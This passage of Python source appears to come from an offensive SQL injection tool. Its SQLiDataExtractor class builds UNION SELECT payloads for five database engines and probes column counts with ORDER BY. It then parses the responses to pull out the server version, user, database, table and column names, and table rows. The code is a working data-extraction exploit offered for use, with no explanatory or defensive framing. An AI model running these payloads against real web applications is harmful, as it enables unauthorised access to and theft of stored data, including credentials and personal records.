        results = []
        for query in queries:
            try:
                data = {param: query}
                response = self.requester.request(url, "POST", data=data)
                if response:
                    results.append(
                        {
                            "query": query,
                            "response": response.text,
                        }
                    )
            except Exception as e:
                print(f"{Colors.error(f'Dump error: {e}')}")

        return results


class SQLiDataExtractor:
    """Extract data through confirmed SQL injection vulnerabilities.

    Supports UNION-based extraction for MySQL, PostgreSQL, MSSQL, Oracle and
    SQLite.  Each ``extract_*`` method sends one or more crafted payloads and
    parses the response to pull out the requested information.
    """

    # Column-count discovery limits
    _MAX_COLUMNS = 20

    # Maximum length for SQL identifiers (table/db/column names)
    _MAX_IDENTIFIER_LENGTH = 128

    # DB-specific queries for information schema
    _INFO_QUERIES = {
        "mysql": {
            "version": "SELECT @@version",
            "current_db": "SELECT database()",
            "current_user": "SELECT user()",
            "databases": "SELECT schema_name FROM information_schema.schemata",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
            "rows": "SELECT {cols} FROM {db}.{table} LIMIT {limit} OFFSET {offset}",
        },
        "postgresql": {
            "version": "SELECT version()",
            "current_db": "SELECT current_database()",
            "current_user": "SELECT current_user",
            "databases": "SELECT datname FROM pg_database",
            "tables": "SELECT tablename FROM pg_tables WHERE schemaname='public'",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
            "rows": "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        },
        "mssql": {
            "version": "SELECT @@version",
            "current_db": "SELECT DB_NAME()",
            "current_user": "SELECT SYSTEM_USER",
            "databases": "SELECT name FROM master.sys.databases",
            "tables": "SELECT name FROM {db}.sys.tables",
            "columns": "SELECT name FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{db}.dbo.{table}')",
            "rows": "SELECT TOP {limit} {cols} FROM {db}.dbo.{table}",
        },
        "oracle": {
            "version": "SELECT banner FROM v$version WHERE ROWNUM=1",
            "current_db": "SELECT ora_database_name FROM dual",
            "current_user": "SELECT user FROM dual",
            "databases": "SELECT DISTINCT owner FROM all_tables",
            "tables": "SELECT table_name FROM all_tables WHERE owner='{db}'",
            "columns": "SELECT column_name FROM all_tab_columns WHERE table_name='{table}' AND owner='{db}'",
            "rows": "SELECT {cols} FROM {db}.{table} WHERE ROWNUM<={limit}",
        },
        "sqlite": {
            "version": "SELECT sqlite_version()",
            "current_db": "SELECT 'main'",
            "current_user": "SELECT 'default'",
            "databases": "SELECT 'main'",
            "tables": "SELECT name FROM sqlite_master WHERE type='table'",
            "columns": "SELECT name FROM pragma_table_info('{table}')",
            "rows": "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
        },
    }

    def __init__(
        self,
        requester,
        *,
        db_type: str = "mysql",
        num_columns: int = 0,
        injectable_index: int = 1,
        prefix: str = "'",
        suffix: str = " --",
        method: str = "GET",
    ):
        self.requester = requester
        self.db_type = db_type.lower()
        self.num_columns = num_columns
        self.injectable_index = injectable_index
        self.prefix = prefix
        self.suffix = suffix
        self.method = method
        self._marker_tag = "AAAXTRCTAAA"

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _build_union_payload(self, inner_query: str) -> str:
        """Build a full UNION SELECT payload injecting *inner_query* at the
        injectable column position.  Other columns are filled with NULL.

        Returns an empty string when column count is unknown (0) to
        prevent sending malformed queries.
        """
        if self.num_columns < 1:
            return ""
        cols = []
        for i in range(self.num_columns):
            if i == self.injectable_index:
                cols.append(self._wrap_concat(inner_query))
            else:
                cols.append("NULL")
        return f"{self.prefix} UNION SELECT {','.join(cols)}{self.suffix}"

    def _wrap_concat(self, expr: str) -> str:
        """Wrap *expr* in database-specific string concatenation with
        the extraction markers."""
        tag = self._marker_tag
        if self.db_type in ("mysql", "sqlite"):
            return f"CONCAT('{tag}',({expr}),'{tag}')"
        elif self.db_type == "postgresql":
            return f"'{tag}'||({expr})||'{tag}'"
        elif self.db_type == "mssql":
            return f"'{tag}'+CAST(({expr}) AS VARCHAR)+'{tag}'"
        elif self.db_type == "oracle":
            return f"'{tag}'||({expr})||'{tag}'"
        return f"CONCAT('{tag}',({expr}),'{tag}')"

    def _send(self, url: str, param: str, payload: str):
        """Fire the payload and return the response text or ''."""
        if not payload:
            return ""
        data = {param: payload}
        try:
            resp = self.requester.request(url, self.method, data=data)
            return resp.text if resp else ""
        except Exception:
            return ""

    def _extract_between_markers(self, text: str) -> list:
        """Return all strings enclosed between the extractor markers."""
        results = []
        tag = self._marker_tag
        parts = text.split(tag)
        # Parts at odd indices (1, 3, 5, …) are the extracted values
        for i in range(1, len(parts), 2):
            val = parts[i].strip()
            if val:
                results.append(val)
        return results

    # ------------------------------------------------------------------
    # Column-count detection
    # ------------------------------------------------------------------

    def detect_columns(self, url: str, param: str) -> int:
        """Detect the number of columns via ``ORDER BY`` probing."""
        for n in range(1, self._MAX_COLUMNS + 1):
            payload = f"{self.prefix} ORDER BY {n}{self.suffix}"
            text = self._send(url, param, payload)
            # If the response contains an error the previous count was valid
            error_keywords = ["error", "unknown column", "order by", "sqlstate", "syntax"]
            if any(kw in text.lower() for kw in error_keywords):
                self.num_columns = n - 1
                return self.num_columns
        self.num_columns = 0
        return 0

    # ------------------------------------------------------------------
    # Public extraction methods
    # ------------------------------------------------------------------

    def extract_version(self, url: str, param: str) -> str:
        """Return the database server version string."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get("version", "")
        if not q:
            return ""
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        results = self._extract_between_markers(text)
        return results[0] if results else ""

    def extract_current_db(self, url: str, param: str) -> str:
        """Return the name of the current database."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get("current_db", "")
        if not q:
            return ""
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        results = self._extract_between_markers(text)
        return results[0] if results else ""

    def extract_current_user(self, url: str, param: str) -> str:
        """Return the current database user."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get("current_user", "")
        if not q:
            return ""
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        results = self._extract_between_markers(text)
        return results[0] if results else ""

    def extract_databases(self, url: str, param: str) -> list:
        """Return a list of database/schema names."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get("databases", "")
        if not q:
            return []
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        return self._extract_between_markers(text)

    def _sanitize_identifier(self, name: str) -> str:
        """Allow only safe SQL identifier characters (alphanumeric + underscore)."""
        max_len = self._MAX_IDENTIFIER_LENGTH - 1
        if not re.fullmatch(rf"[A-Za-z_]\w{{0,{max_len}}}", name):
            return ""
        return name

    def extract_tables(self, url: str, param: str, db: str = "") -> list:
        """Return table names for the given database."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get("tables", "")
        if not q:
            return []
        db = self._sanitize_identifier(db) if db else ""
        q = q.format(db=db)
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        return self._extract_between_markers(text)

    def extract_columns(self, url: str, param: str, table: str, db: str = "") -> list:
        """Return column names for the given table."""
        q = self._INFO_QUERIES.get(self.db_type, {}).get("columns", "")
        if not q:
            return []
        table = self._sanitize_identifier(table) if table else ""
        db = self._sanitize_identifier(db) if db else ""
        if not table:
            return []
        q = q.format(table=table, db=db)
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        return self._extract_between_markers(text)

    def extract_rows(
        self, url: str, param: str, table: str, columns: list, *, db: str = "", limit: int = 10, offset: int = 0
    ) -> list:
        """Return rows from the given table as a list of dicts."""
        # Enforce integer types for limit/offset to prevent injection
        if not isinstance(limit, int) or limit < 0:
            limit = 10
        if not isinstance(offset, int) or offset < 0:
            offset = 0
        # Sanitize table and db identifiers
        table = self._sanitize_identifier(table) if table else ""
        db = self._sanitize_identifier(db) if db else ""
        if not table:
            return []
        q = self._INFO_QUERIES.get(self.db_type, {}).get("rows", "")
        if not q or not columns:
            return []
        # Sanitise column names – only allow alphanumeric + underscore
        safe_cols = [c for c in columns if re.fullmatch(r"[A-Za-z_]\w*", c)]
        if not safe_cols:
            return []
        # Build DB-specific row concatenation
        if self.db_type in ("mysql", "sqlite"):
            concat_expr = "CONCAT_WS(',', " + ",".join(safe_cols) + ")"
        elif self.db_type == "postgresql":
            concat_expr = " || ',' || ".join(safe_cols)
        elif self.db_type == "mssql":
            casts = [f"CAST({c} AS VARCHAR)" for c in safe_cols]
            concat_expr = " + ',' + ".join(casts)
        elif self.db_type == "oracle":
            concat_expr = " || ',' || ".join(safe_cols)
        else:
            concat_expr = "CONCAT_WS(',', " + ",".join(safe_cols) + ")"
        q = q.format(cols=concat_expr, db=db, table=table, limit=limit, offset=offset)
        payload = self._build_union_payload(q)
        text = self._send(url, param, payload)
        raw = self._extract_between_markers(text)
        rows = []
        for line in raw:
            parts = line.split(",")
            row = {}
            for i, col in enumerate(safe_cols):
                row[col] = parts[i] if i < len(parts) else ""
            rows.append(row)
        return rows
